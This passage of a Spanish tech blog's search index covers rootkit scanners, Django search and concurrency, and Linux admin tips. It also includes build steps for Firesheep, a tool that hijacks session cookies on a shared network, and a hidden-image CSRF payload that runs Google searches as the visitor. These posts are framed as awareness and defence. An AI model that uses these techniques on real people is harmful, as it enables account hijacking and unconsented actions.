[A]ll","tags":"admin","url":"https://karpoke.ignaciocano.com/2010/12/30/la-infame-actualizacion-de-wordpress-en-15-segundos/","loc":"https://karpoke.ignaciocano.com/2010/12/30/la-infame-actualizacion-de-wordpress-en-15-segundos/"},{"title":"Robando la identidad del vecino","text":"Firesheep es un complemento para Firefox que permite robar la identidad de los usuarios de diferentes redes sociales ( Dropbox , Facebook , Flickr, Google , Twitter, Windows Live, Wordpress ...) que se encuentren conectados a la misma red que el ladrón. La mejor manera de evitarlo es cifrar el tráfico, por ejemplo utilizando HTTPS-everywhere , otro complemento para Firefox. Poco después surgió Blacksheep , otro complemento más, que nos alerta si un usuario de la misma red está utilizando FireSheep. Tanto Firesheep como Blacksheep no están disponibles para Firefox en GNU/Linux desde el menú de complementos de Firefox, pero podemos instalarlo si recompilamos la extensión . El ejemplo en el enlace anterior está pensado para CentOS, pero para Ubuntu Maverick Merkat es prácticamente igual: Blacksheep para Firefox en Ubuntu Maverick Meerkat Se requiere: bash $ sudo aptitude install autoconf libpcap-dev xulrunner-dev libboost-dev libhal-dev En Ubuntu no habrá problemas con la versión de autoconf , ya que es superior a la 2.61: bash $ autoconf -V bash autoconf (GNU Autoconf) 2.67 Ni con la de libpcap-dev , ya que viene la 1.1.1-2: bash $ aptitude show libpcap-dev bash Paquete: libpcap-dev Estado: instalado Instalado automáticamente: no Versión: 1.1.1-2 Suponemos que vamos a trabajar en el directorio de usuario. Tenemos que compilar el back-end de Firesheep. Lo primero será bajarnos el código de Firesheep: bash $ git clone git://github.com/mickflemm/firesheep.git Y ahora lo compilamos: bash $ cd firesheep $ git submodule update --init $ ./autogen.sh --with-xulrunner-sdk=/usr/lib/xulrunner-devel-1.9.2.13/ $ make Vamos a comprobar que el backend funciona correctamente: bash $ cd xpi/platform/Linux_x86-gcc3/ $ sudo ./firesheep-backend --fix-permissions $ ./firesheep-backend --list-interfaces Nos devuelve algo como: bash {\"eth0\":{\"name\":\"Networking Interface\",\"type\":\"ethernet\"}, \"eth2\":{\"name\":\"WLAN Interface\",\"type\":\"ethernet\"}, \"lo\":{\"name\":\"Loopback device Interface\",\"type\":\"ethernet\"}} Para comprobar que podemos capturar paquetes ejecutamos: bash $ ./firesheep-backend eth2 \"tcp port 80\" Abrimos una página de internet, o en otra consola ejecutamos algo como: bash $ wget http://www.zscaler.com/ Si todo va bien, nos empezará a devolver cosas como: bash {\"from\":\"192.168.0.32:49670\", \"to\":\"72.249.144.174:80\", \"method\":\"GET\", \"path\":\"/\", \"query\":\"\", \"host\":\"www.zscaler.com\", \"cookies\":\"\", \"userAgent\":\"Wget/1.12 (linux-gnu)\"} Ahora vamos a incluir el back-end en el complemento BlackSheep: bash cd ~ wget http://www.zscaler.com/research/plugins/firefox/blacksheep/blacksheep-latest.xpi mkdir blacksheep unzip blacksheep-latest.xpi -d blacksheep/ cd blacksheep cp -r ../firesheep/xpi/platform/* platform/ Del archivo install.rdf , borraremos las líneas: xml Darwin_x86-gcc3 WINNT_x86-msvc em:updateURL=\"http://www.zscaler.com/research/plugins/firefox/blacksheep/update.rdf\" La última línea es para evitar las actualizaciones automáticas. Ahora ya podemos crear el .xpi : bash $ zip blacksheep-latest-linux.xpi -r * Lo instalamos y reiniciamos Firefox. Nos pedirá permisos de administrador para poder ejecutar el complemento. Introducimos la contrseña y listos. Como corolario, he subido el complemento al directorio público . Firesheep para Firefox en Ubuntu Maverick Meerkat Dado que ya nos hemos bajado el código de Firesheep y lo hemos compilado, tenemos disponible el .xpi en el directorio ~/firesheep/build/firesheep.xpi . También se encuentra disponible en el directorio público . Después de instalarlo, será necesario darle permisos manualmente para que detecte las interfaces: bash $ cd ~/.mozilla/firefox/ygqde9s7.default/extensions/firesheep@codebutler.com/platform/Linux_x86-gcc3/ $ sudo ./firesheep-backend --fix-permissions El menú de Firesheep es accesible a través del panel lateral: Ver / Panel lateral / Firesheep o Ctrl+Shft+s . \"Firesheep\" \"cómo publicar directorios en ubuntu one y dropbox\" \"señoras que se ponen un nombre falso en facebook pero usan su dirección de correo personal\" \"csrf en las búsquedas de google\" \"la infame actualización de wordpress en 15 segundos\" \"https everywhere\" \"Blacksheep\"","tags":"hack","url":"https://karpoke.ignaciocano.com/2010/12/18/robando-la-identidad-del-vecino/","loc":"https://karpoke.ignaciocano.com/2010/12/18/robando-la-identidad-del-vecino/"},{"title":"Buscando rootkits y troyanos","text":"Tres herramientas muy útiles: rkhunter , chkrootkit y unhide . rkhunter Busca rootkits , puertas traseras y exploits . Al instalarlo, se programa un escaneo diario, pero cuando instalamos las actualizaciones de algunos programas, las firmas de rkhunter quedan obsoletas , por lo que empieza a mandar avisos. bash Warning: The file properties have changed: File: /usr/bin/md5sum Current inode: 1093680 Stored inode: 475456 Current file modification time: 1285094009 (21-sep-2010 20:33:29) Stored file modification time : 1267759792 (05-mar-2010 04:29:52) Podemos actualizar las firmas de rkhunter ejecutando: bash $ sudo rkhunter --propupd El motivo de que no se actualicen las firmas automáticamente es que es responsabilidad del usuario asegurarse de que los ficheros del sistema son genuinos y provienen de una fuente fiable. Cuando ejecutamos el comando anterior, le estamos diciendo a rkhunter que acepte las firmas de los nuevos ficheros como válidas y a éstos como genuinos. Directorios o ficheros ocultos Si usamos Ubuntu, es posible que nos llegue un correo de aviso de rkhunter diciendo que ha encontrado una serie de directorios ocultos, pero que son legítimos en Ubuntu. Por ejemplo: bash Warning: Hidden directory found: /dev/.udev Para solucionarlo, editamos el fichero de configuración /etc/rkhunter.conf y descomentamos, o añadimos, las líneas referentes a dichos directorios: bash ALLOWHIDDENDIR=/dev/.udev Si en lugar de un directorio es un fichero, la directiva a utilizar es ALLOWHIDDENFILE . Después de introducir los cambios, actualizamos rkhunter : bash $ sudo rkhunter --propupd Actualización a 17 de marzo de 2013 La versión de los repositorios, la 1.3.8, tiene un pequeño fallo por el cual los enlaces simbólicos no pueden ser ignorados mediante la directiva ALLOWHIDDENFILES , por lo que aparece un mensaje como el siguiente: bash Warning: Hidden file found: /dev/.initramfs: symbolic link to `/run/initramf`s En la versión 1.4.0 ya está corregido, aunque aún no se encuentra en los repositorios en Ubuntu 12.04.2. Una alternativa es parchear el script [parchear el script ]. Editamos el script en Python y vamos a la línea 846: bash $ sudo vim +846 /usr/bin/rkhunter Justo a continuación, deberemos comprobar si el fichero en un enlace simbólico, por lo que el código deberá queda así: ```bash elif [ -d \" \\({FNAME}\" ]; then # # For the ALLOWHIDDENFILE option we need to allow # a hidden symbolic link to a directory. # test \"\\) {OPT_NAME}\" = \"ALLOWHIDDENFILE\" -a -h \"${FNAME}\" && continue case \"${OPT_NAME}\" in ``` Ahora ya podemos añadir el fichero en el archivo de configuración /etc/rkhunter.conf : bash ALLOWHIDDENFILE=\"/dev/.initramfs\" Y actualizar la base de datos de firmas: bash $ sudo rkhunter --propupd Si usamos algún programa que comprueba la integridad de los ficheros, como por ejemplo tiger , es posible que recibamos una aviso como el siguiente: bash NEW: --FAIL-- [lin005f] Installed file '/usr/bin/rkhunter' checksum differs from installed package 'rkhunter'. Comandos que cambian a scripts Si se añade un script al PATH del sistema o sustituye a algún comando, rkhunter también nos lo notificará. Por ejemplo: bash Warning: The command '/sbin/chkconfig' has been replaced by a script: /sbin/chkconfig: a /usr/bin/perl script text executable Si estamos seguros de que el cambio es legítimos, podemos añadir la siguiente línea en /etc/rkhunter.conf : bash SCRIPTWHITELIST=/sbin/chkconfig Después de introducir los cambios, actualizamos rkhunter : bash $ sudo rkhunter --propupd rkhunter y reiserfs Si nuestro sistema de ficheros es reiserfs , o xfs , y hemos instalado el paquete e2fsprogs , el cual contiene herramientas para trabajar con sistemas de ficheros ext2 , ext3 y ext4 , es posible que recibamos un aviso que se queja de lsattr : Warning: Checking for prerequisites [ Warning ] No output from the 'lsattr' command - all file immutable-bit checks will be skipped. La solución pasa por editar el fichero /etc/rkhunter.conf , buscar la directiva DISABLE_TESTS y añadir el parámetro immutable al final. A continuación, actualizamos rkhunter : bash $ sudo rkhunter --propupd chkrootkit ...detecta rootkits . Por defecto, sólo se ejecuta cuando lo lanzamos nosotros. Para que se realice un escaneo diario, modificaremos el fichero /etc/chkrootkit.conf : bash RUN_DAILY=\"true\" Actualizado el 2 de noviembre de 2013 En los reportes de chkrootkit es posible que nos llegue el aviso de que el archivo /sbin/init está infectado: bash Warning: /sbin/init INFECTED Parece ser un fallo en chkrootkit , ya que para determinar si el archivo /sbin/init está infectado, lo que hace es buscar la cadena \"HOME\" el el fichero, mediante el comando strings : bash $ strings /sbin/init | egrep HOME XDG_CACHE_HOME XDG_CONFIG_HOME El fallo está presente al menos en la versión 0.49, que es la que hay disponible en los repositorios de Ubuntu Saucy Salamander. Una manera de evitar el aviso es buscar el siguiente trozo de código, alrededor de la línea 1005: bash if [ ${SYSTEM} != \"HP-UX\" ] && ( ${strings} ${ROOTDIR}sbin/init | ${egrep} HOME || cat ${ROOTDIR}/proc/1/maps | ${egrep} \"init.\" ) >/dev/null 2>&1 Y sustituirlo por: bash if [ ${SYSTEM} != \"HP-UX\" ] && ( cat ${ROOTDIR}/proc/1/maps | ${egrep} \"init.\" ) >/dev/null 2>&1 unhide Detecta procesos ocultos y puertas traseras, basándose en la información obtenida de /proc , /bin/ps y syscalls , y de los puertos activos que no aparecen según /bin/netstat . En la versión unhide-20100201-1 , para el listado de procesos, comprueba los resultados de /bin/ps , ejecutándolo de las siguientes maneras: ```c // we are looking only for real process not thread and only one by one define COMMAND \"ps --no-header -p %i o pid\" // we ara looking for session ID one by one define SESSION \"ps --no-header -s %i o sess\" // We are looking for group ID one by one // but ps can't select by pgid define PGID \"ps --no-header -eL o pgid\" // We are looking for all processes even threads define THREADS \"ps --no-header -eL o lwp\" // for sysinfo scanning, fall back to old command, as --no-header seems to create // an extra process define SYS_COMMAND \"ps -eL o lwp\" ``` En escaneo de puertos utiliza los resultados de /bin/netstat : c // Linux char tcpcommand[]= \"netstat -tan | sed -e '/[\\\\.:][0-9]/!d' -e 's/.*[\\\\.:]\\\\([0-9]*\\\\) .*[\\\\.:].*/\\\\1/'\" ; char udpcommand[]= \"netstat -uan | sed -e '/[\\\\.:][0-9]/!d' -e 's/.*[\\\\.:]\\\\([0-9]*\\\\) .*[\\\\.:].*/\\\\1/'\" ; Podemos lograr que se ejecute periódicamente añadiendo al crontab algo como: bash 0 8 * * * unhide-linux26 proc 2>&1 | mail -s \"Daily unhide-linux26 proc Scan\" user@example.com 30 8 * * * unhide-linux26 sys 2>&1 | mail -s \"Daily unhide-linux26 sys Scan\" user@example.com 0 9 * * * unhide-linux26 brute 2>&1 | mail -s \"Daily unhide-linux26 brute Scan\" user@example.com 30 9 * * * unhide-tcp 2>&1 | mail -s \"Daily unhide-tcp Scan\" user@example.com if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2010/12/17/buscando-rootkits-y-troyanos/","loc":"https://karpoke.ignaciocano.com/2010/12/17/buscando-rootkits-y-troyanos/"},{"title":"Mejora del rendimiento interactivo agrupando tareas por terminal","text":"El parche de 200 líneas para el kernel, o su versión en espacio de usuario , mejora el rendimiento interactivo agrupando los procesos por tty . La mejora sólo será notable si tenemos varios procesos asociados a un terminal que tengan un consumo importante de CPU, ya que la potencia de ésta no se repartirá entre el número de procesos sino entre el número de grupos de procesos. De ahí que sea una mejora interactiva , el ordenador no irá más rápido, pero sí tendremos la sensación de que responde más rápido. Este parche requiere un kernel superior al 2.6.36 con soporte a grupos de tareas. Para saber los procesos que están asociados a una terminal podemos ejecutar: bash $ ps -e | grep -v ? (Los procesos que tienen un interrogante no están asociados a ninguna terminal.) Para aplicar el parche, en Ubuntu: editamos el archivo /etc/rc.local y añadimos, antes del exit 0 : bash $ mkdir -p /dev/cgroup/cpu $ mount -t cgroup cgroup /dev/cgroup/cpu -o cpu $ mkdir -m 0777 /dev/cgroup/cpu/user $ echo \"/usr/local/sbin/cgroup_clean\" > /dev/cgroup/cpu/release_agent lo hacemos ejecutable, por si acaso no lo estuviera ya: bash $ sudo chmod +x /etc/rc.local editamos nuestro ~/.bashrc y añadimos: bash if [ \"$PS1\" ]; then mkdir -p -m 0700 /dev/cgroup/cpu/user/$$ echo $$ > /dev/cgroup/cpu/user/$$/tasks echo \"1\" > /dev/cgroup/cpu/user/$$/notify_on_release fi creamos el archivo /usr/local/sbin/cgroup_clean y añadimos: bash #!/bin/sh if [ \"$*\" != \"/user\" ]; then rmdir /dev/cgroup/cpu/$* fi le damos permisos de ejecución: bash $ sudo chmod +x /usr/local/sbin/cgroup_clean y, por último, ejecutamos el script : bash $ sudo /etc/rc.local o reiciniamos: bash $ sudo reboot","tags":"admin","url":"https://karpoke.ignaciocano.com/2010/12/16/mejora-del-rendimiento-interactivo-agrupando-tareas-por-terminal/","loc":"https://karpoke.ignaciocano.com/2010/12/16/mejora-del-rendimiento-interactivo-agrupando-tareas-por-terminal/"},{"title":"CSRF en las búsquedas de Google","text":"No se ha encontrado ningún resultado Si ahora mismo tienes una sesión de Google iniciada, puedes ir al histórico de búsquedas de Google y verás que aparece una búsqueda que no has realizado... conscientemente. El truco, un ataque CSRF comentado por Jeremiah Grossman , consiste en añadir en el código HTML de la página una imagen cuyo src sea la URL de la búsqueda que queramos que realice el que visite la página. Por ejemplo: html <img src=\"http://www.google.es/search?q=%22terminus.ignaciocano.com%22\" border=\"0\" height=\"0\" width=\"0\">","tags":"hack","url":"https://karpoke.ignaciocano.com/2010/12/13/csrf-en-las-busquedas-de-google/","loc":"https://karpoke.ignaciocano.com/2010/12/13/csrf-en-las-busquedas-de-google/"},{"title":"Dyndns e inadyn","text":"Dyndns no hace mucho que cambió su política de servicios, reduciendo el número de direcciones gratuitas que se podían gestionar con una cuenta de usuario de 5 a 2, y reduciendo también el número de dominios entre los que escoger. Sin embargo, si antes de que cambiaran la política ya teníamos más de 2 direcciones o eran de dominios que ya no están disponibles, podremos seguir conservándolos mientras sigan siendo utilizados, es decir, mientras se siga actualizando regularmente la IP a la que deben apuntar, como mínimo una vez al mes. Si actualmente usamos la dirección no hay problema, ya se encarga el router o el cliente de escritorio de actualizarla. Pero si tenemos alguna dirección que no estamos utilizando pero que queremos conservar y tenemos más de 2 direcciones en nuestra cuenta, corremos el peligro de que se nos pase y la perdamos. Una forma de evitar esto es utilizar el comando inadyn , que permite actualizar la IP de la dirección que especifiquemos. Para poder incluirlo en el cron , lo mejor será crear un pequeño script , de tal manera que nuestra contraseña no quede registrada en ningún fichero de log (como sí quedaría si pusíeramos el comando directamente en el crontab ): bash /usr/sbin/inadyn -u user -p pass --iterations 1 --dyndns_system custom@dyndns.org -a terminus.ignaciocano.com -a anacreonte.homelinux.com Podemos añadir tantos subdominios como queramos, o tengamos, precedidos del argumento -a .","tags":"admin","url":"https://karpoke.ignaciocano.com/2010/12/11/dyndns-e-inadyn/","loc":"https://karpoke.ignaciocano.com/2010/12/11/dyndns-e-inadyn/"},{"title":"Póster casero","text":"Si tenemos una imagen y queremos crear un póster impreso (y montado a base de folios) por nosotros mismos podemos utilizar un servicio como Block posters . También podemos utilizar los comandos convert y pdfposter para conseguir lo mismo. Primero creamos un PDF a partir de la imagen, en este caso del mapa del software libre : bash $ convert mapa-del-software-libre.png mapa-del-software-libre.pdf Ahora ya podemos crear el póster: bash $ pdfposter -mA4 -pA0 mapa-del-software-libre.pdf poster-del-mapa-del-software-libre.pdf El argumento -m indica el tamaño del medio en que se va a imprimir, en este caso el tamaño es A4. El argumento -p indica el tamaño deseado, en este caso, A0. Hay otras combinaciones comentadas en la página del manual de pdfposter . La imagen, el PDF y el póster que he utilizado de ejemplo se pueden encontrar en mi directorio público de Ubuntu One .","tags":"dev","url":"https://karpoke.ignaciocano.com/2010/12/11/poster-casero/","loc":"https://karpoke.ignaciocano.com/2010/12/11/poster-casero/"},{"title":"Intercambio de los valores de dos variables","text":"En algunos lenguajes, intercambiar el valor de la variable a por el de la variable b implica, explícitamente, utilizar una variable temporal: bash t = a; a = b; b = t; En Python: python a, b = b, a Pero esperen, aún hay más: python a, b, c, d = d, c, b, a Actualizado el 31 de julio de 2011 En Bash : bash $ read a b c <<< $(echo $c $b $a) Otra manera : bash $ read a b c <<(echo $c $b $a) Actualizado el 23 de junio de 2016 Si los valores son numéricos, podemos recurrir a sumas y restas: python In [1]: a, b = 3, 5 In [2]: a = a + b In [3]: b = a - b In [4]: a = a - b In [5]: a, b Out[5]: (5, 3) O multiplicaciones y divisiones: python In [1]: a, b = 3.2, 5.7 In [2]: a = a * b In [3]: b = a / b In [4]: a = a / b In [5]: a, b Out[5]: (5.7, 3.2)","tags":"dev","url":"https://karpoke.ignaciocano.com/2010/12/03/intercambio-de-los-valores-de-dos-variables/","loc":"https://karpoke.ignaciocano.com/2010/12/03/intercambio-de-los-valores-de-dos-variables/"},{"title":"Buscar en todos los campos de un modelo en Django","text":"Una acción típica que se va a repetir en, prácticamente, cada listado que mostremos, es la de añadir un buscador [1]. Un buscador típico incluirá un pequeño formulario en la misma página de listado: html <form method=\"get\" action=\"\"> <input type=\"text\" name=\"q\" value=\"{{ q }}\" /> <input type=\"submit\" value=\"Search\" /> </form> Nos interesaría no tener que ir copiando y pengando este código en cada listado. Aunque sea un código que no vaya a cambiar, viola el principio de DRY. Una mejor solución pasa por crear un templatetag , en el fichero my_tags.py dentro del directorio templatetags : python @register.inclusion_tag('search_form.html', takes_context=True) def display_search_form(context): return { 'q': context['q'], } search_forml.html es la plantilla HTML que contiene el formulario mostrado arriba. Mediante el decorador register.inclusion_tag permitimos que a la plantilla HTML le llegue la variable q del contexto, que contiene la búsqueda. Y luego, en la plantilla del listado, incluimos el templatetag python {% load my_tags %} Allá donde queramos que aparezca el buscador incluiremos lo siguiente: python {% display_search_form %} Sólo queda ver el contenido de la vista que muestra el listado. En particular, deberemos recoger la variable q que nos puede llegar por GET . Algo así: python q = request.GET.get(\"q\", \"\") Antes de modificar la consulta para filtrar los resultados que concuerden con nuestra búsqueda, hay diferentes aspectos que deberíamos tener en cuenta referentes a las búsquedas. Lo primero es sobre qué vamos a buscar, es decir, sobre qué campos del modelo que vamos a buscar. Pero también podríamos tener una serie de palabras clave asociadas y guardadas en otro modelo qué también nos gustaría que se tuvieran en cuenta en la búsqueda. O podríamos buscar, para cada clave foránea, en los campos de ese modelo. Lo siguiente es cómo interpretar esa búsqueda. Podríamos buscar una coincidencia exacta de todo lo que hemos buscado, que debería coincidir con, o estar contenida en, el contenido de un campo. También podríamos realizar una búsqueda más elaborada, separando la búsqueda en palabras. o añadir modificadores, estilo Google, para, por ejemplo, excluir palabras. Utilizaremos el código publicado por Julien Phalip para realizar esta búsqueda de forma que nos sirva para lo que pretendemos. El método de Julien separa las palabras de la búsqueda para montar un query que utiliza para filtrar el resultado según la lista de campos proporcionada. Nos basaremos en este método para extender la búsqueda a todos los campos del modelo y los campos de los modelos referenciados por las claves foráneas de éste. python def get_full_query(query_string, model): \"\"\" Returns a query to search in every field of the given model \"\"\" fields = [] for f in model._meta.fields: if not f.rel: fields.append(f.name) else: rel_fields = [ \"%s__%s\" % (f.name, fr.name) for fr in f.rel.to._meta.fields if not fr.rel ] fields.extend(rel_fields) return get_query(query_string, fields) model._meta.fields devuelve, como su nombre indica, un listado con los campos del modelo. Cada campo tiene, entre otros, los atributos name , con el nombre del campo, y rel , que, en el caso de una clave foránea, contiene el modelo al que hace referencia. En la vista del listado tendremos: python queryset = MyTable._default_manager.all() # [2] if q: query = get_full_query(q, MyTable) queryset = queryset.filter(query) Este queryset contiene el listado que le pasamos a la plantilla: python return render_to_response(\"my_list.html\", { \"object_list\": queryset, \"q\": q, }, context_instance=RequestContext(request)) » [1] Existen aplicaciones para realizar búsquedas, como haystack o django-sphinx . » [2] Según James Bennett, en \"Django practical projects\", utilizar _default_manager en lugar de objects es una buena práctica, ya que podría ser que el modelo tuviera un manager personalizado. Utilizar _default_manager siempre es seguro.","tags":"dev","url":"https://karpoke.ignaciocano.com/2010/11/19/buscar-en-todos-los-campos-de-un-modelo-en-django/","loc":"https://karpoke.ignaciocano.com/2010/11/19/buscar-en-todos-los-campos-de-un-modelo-en-django/"},{"title":"Control de concurrencia optimista en Django","text":"Si tenemos una aplicación multiusuario, podría darse el caso de que dos usuarios accediesen simultáneamente al mismo registro para editarlo. Si no controlamos este evento, sucederá que el primero que guarde, que no tiene porqué ser el primero que comenzó a editar, perderá los cambios, y lo que es peor, sin enterarse. Una solución sería utilizar transacciones [1], pero éstas deberían abarcar varias peticiones HTTP, desde que se empieza a editar hasta que se guarda satisfactoriamente (o no), con lo que la solución idónea se complica. Una solución más sencilla, pero efectiva en la inmensa mayoría de casos, es utilizar el control de concurrencia optimista (también comentado en slashdot ). El control de concurrencia optimista se basa en el hecho de que es bastante improbable que la edición concurrente se dé, por lo que la solución más sencilla pasa por detectarla y avisar al usuario en caso de que ocurra, obligándole a repetir el proceso de edición. La simplicidad de la solución unida a la baja probabilidad de que suceda hacen de ella una solución interesante y práctica. Lo de la baja probabilidad es importante, ya que si los usuarios tuvieran que estar constantemente repitiendo el proceso de edición dejaría de ser una solución práctica. Para implementarla, necesitamos conocer si el registro que estamos editando ha sido modificado desde la última vez que accedimos a él. Podemos lograr esto incluyendo un campo que contenga un número de versión, que se incrementa con cada edición. Si a la hora de guardar, el número de versión no es el mismo que había cuando nosotros accedimos al registro, es que alguien se nos ha adelantado. En lugar de un número de versión, también podemos utilizar un campo timestamp . La ventaja de éste último es que podemos definir el campo con la opción auto_now=True y nos olvidamos de tener que actualizarlo, ya que ya lo hacer Django por nosotros. El siguiente ejemplo, proporcionado por Andrei Savu, muestra la idea: python updated = Entry.objects.filter(Q(id=e.id) && Q(version=e.version)) .update(updated_field=new_value, version=e.version+1) if not updated: raise ConcurrentModificationException() La operación se realiza de forma atómica, ya que filter es un método perezoso , es decir, no implica un operación de base de datos inmediatamente. Otra solución propuesta consiste en sobreescribir el método save para comprobar si el registro ha sido modificado justo antes de guardarlo (en lugar de filtrar y actualizar): python def save(self): if(self.id): foo = Foo.objects.get(pk=self.id) if(foo.timestamp > self.timestamp): raise Exception, \"trying to save outdated Foo\" super(Foo, self).save() Sin embargo, esta solución presenta un problema de condición de carrera. La operación de consultar el último valor y la operación de guardar no se realizan de forma atómica, por lo que podría darse el caso de que ambos guardasen a la vez y el sistema ejecutara las instrucciones de tal manera (alternativamente, para ser más concretos) que cada uno pensaría que había sido el último en guardar, por lo que el segundo sobreescribiría al primero, pero sin que a éste se le notificara. [1] Existe una aplicación para Django, django-locking , que nos brinda el control de concurrencia, permitiendo, además, que los usuarios sepan si un registro ha sido bloqueado, e incluso que les permita acceder en modo de sólo lectura.","tags":"dev","url":"https://karpoke.ignaciocano.com/2010/11/05/control-de-concurrencia-optimista-en-django/","loc":"https://karpoke.ignaciocano.com/2010/11/05/control-de-concurrencia-optimista-en-django/"},{"title":"Cómo publicar directorios en Ubuntu One y Dropbox","text":"Ubuntu One es el servicio que ofrece Ubuntu en la nube. Entre otras cosas, como sincronizar archivos de configuración o nuestros favoritos , permite compartir archivos y directorios de nuestro espacio en la nube con las personas que queramos de una forma sencilla. Tambíen permite publicar archivos, para cada uno de los cuales se genera una URL corta, y que sean accesibles por cualquiera. Sin embargo, no permite publicar directorios , al menos por ahora. ¿Publicar directorios? ¿Qué querríamos conseguir publicando un directorio? Pues que todos los ficheros que contuviera se hicieran públicos, y que se generase un índice, por ejemplo, un index.html , también público, con enlaces a cada fichero contenido en dicho directorio (recordemos que los enlaces son URLs cortas, no el nombre del fichero). ¿URLs cortas? Cuando se publica un fichero, el sistema le asigna una dirección del estilo http://ubuntuone.com/p/N21/ , por lo que no podemos crear un listado de ficheros basándonos en su nombre y situación relativa al fichero index.html . Es decir, no podemos incluir enlaces como <a href=\"./articles/index.html\">articles<a>. Alternativa: ¿Dropbox? Un servicio similar a Ubuntu One es Dropbox, que tampoco permite publicar directorios, al menos directamente, pero el problema anterior queda resuelto, ya que no tiene el inconveniente de las URLs cortas. Basta crear un fichero HTML con enlaces relativos a los ficheros que queramos ofrecer. Se podría crear un listado con el comando tree : bash $ tree -C --charset utf8 --dirsfirst -F -H . -o tree.html Sin embargo, esto tiene un problema, y es que si se pulsa en el enlace de un directorio, obtenemos como resultado que el archivo no existe, ya que tree crea los enlaces a directorios como ./articles/ (Dropbox tampoco permite publicar directorios). Una sencilla solución sería crear ficheros index.html en cada directorio y que los enlaces a los subdirectorios realmente apuntasen a los ficheros index.html que éstos contienen. Esto es lo que hace DropboxIndex , un script creado por Wojciech 'KosciaK' Pietrzok que genera un archivo index.html en la raíz y en cada subdirectorio, con un aspecto similar al listado de ficheros de Apache. El contenido público, por defecto, se encuentra a partir del directorio ~/Dropbox/Public y es posible utilizar enlaces simbólicos que apunten a directorios externos al directorio público. De todas formas, un gran inconveniente que le veo a Dropbox es que, para gestionarlo desde el escritorio, es necesario instalarse software privativo. Alternativa: ¿Ubunu One? Ubuntu One también tiene partes del servidor que son software privativo , pero parece que, al menos, el cliente y los protocolos de comunicación son libres (también se dice algo aquí ). ¿Y las URLs cortas? Existe un comando, u1sdtool , que permite gestionar nuestro espacio en la nube desde el terminal. Con u1sdtool y partiendo del script anterior, he conseguido que se puedan publicar directorios en Ubuntu One . Lo único que se necesita para acceder al directorio, o jerarquía de directorios, es conocer la dirección pública del directorio raíz que hemos publicado. Podemos tener tantos directorios raíz como queramos, siempre que no esté contenido uno dentro de otro, ya que sería éste otro el que sería el directorio raíz. Aún así, se pueden compartir enlaces de directorios públicos intermedios, pero teniendo en cuenta que aparece un enlace para ir subiendo en la jerarquía de directorios hasta llegar al directorio raíz. ubuntuone-index.py Se utiliza exactamente igual que el script para Dropbox: ```bash Usage: ubuntuone-index.py [options] directory Options: -h, --help Show help message and exit. -V, --version print version information -R, --recursive Include subdirectories (disabled by default). -T, --template file Use HTML file as template. ATTENTION: Script will overwrite any existing index.html file(s)! ``` Por ejemplo: bash $ ubuntuone-index.py -R \"~/Ubuntu One/pub\" Descarga el script ubuntuone-index.py . Para más información de cómo crear las plantillas personalizadas podéis visitar la web del proyecto DropboxIndex. Privacidad y términos del servicio Si lo he entendido bien, en su política de privacidad advierten de que obtienen datos del uso que hagamos del servicio, que puede que nos envíen algun correo electrónico ocasionalmente, que posiblemente le pasarán esa información a terceros, aunque intentarán que esos terceros sean buena gente con esos datos, y, lo más interesante, que si violas los términos del servicio, lo tienen todo registrado. Se violan los términos del servicio haciendo algo ilegal o en contra de los derechos o la privacidad de alguien, pudiendo incluso tener que indemnizar a Canonical por posibles daños y perjuicios, y aquí ya no dicen nada de sí te avisan o si primero borran los datos y luego te avisan La licencia de uso de Ubuntu One advierte de diferentes maneras de terminar el uso del servicio: por que lo dicen ellos, aunque se supone que te avisan con un mes de antelación de que borrarán nuestros datos por que pasamos de su servicio y no lo hemos usado en 3 meses; también avisan con antelación por que violas los términos del servicio Por mi parte, todo lo que he subido a mi directorio para hacer las pruebas es contenido, muy bueno, con una licencia libre, que autoriza su redistribución. \"ubuntu one privacy 